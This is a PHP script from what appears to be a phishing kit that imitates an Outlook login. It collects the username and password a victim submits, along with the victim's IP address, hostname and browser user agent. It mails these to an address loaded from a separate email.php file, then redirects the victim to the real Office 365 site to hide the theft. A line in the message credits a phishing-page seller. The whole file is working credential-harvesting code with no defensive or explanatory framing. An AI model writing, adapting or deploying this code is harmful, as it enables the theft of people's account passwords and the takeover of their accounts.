<?php
session_start();
$_SESSION['pass1'] = $_POST['pass'];


if($_POST["email1"] != "" and $_POST["pass2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['email1']."\n";
$message .= "Password:  ".$_POST['pass2']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
include 'email.php';
$subject = "0utlook  | $ip";
$headers = "From: 0utlook <customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail("$to", "$subject", $message);     
}
  header ("Location: http://outlook.office365.com/");
}else{
header ("Location: index.php");
}

?>